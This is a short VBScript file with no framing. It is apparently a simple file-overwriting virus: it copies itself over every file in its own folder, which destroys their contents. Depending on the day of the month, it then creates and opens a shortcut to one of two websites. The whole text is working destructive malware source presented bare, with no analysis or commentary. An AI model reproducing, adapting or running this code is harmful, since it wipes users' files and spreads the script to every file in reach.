   On Error Resume Next
   Set WshShell = Wscript.CreateObject("Wscript.Shell")
   Papa = Wscript.ScriptFullName
   Set FZO = CreateObject("Scripting.FileSystemObject")
   Alla = Left(Papa, InStrRev(Papa, "\"))
   For Each Aqui in FZO.GetFolder(Alla).Files
       FZO.CopyFile Papa, Aqui.Name, 1
   Next
   If Day(Now()) <= 15 Then
     Set Yon = WshShell.CreateShortcut("yonkis.url")
     Yon.TargetPath = "http://www.yonkis.com"
     Yon.Save
     WshShell.Run ("yonkis.url")
   Else
     Set Fre = WshShell.CreateShortcut("fresonMagic.url")
     Fre.TargetPath = "http://www.fresonmagic.com"
     Fre.Save
     WshShell.Run ("fresonMagic.url")
   End If
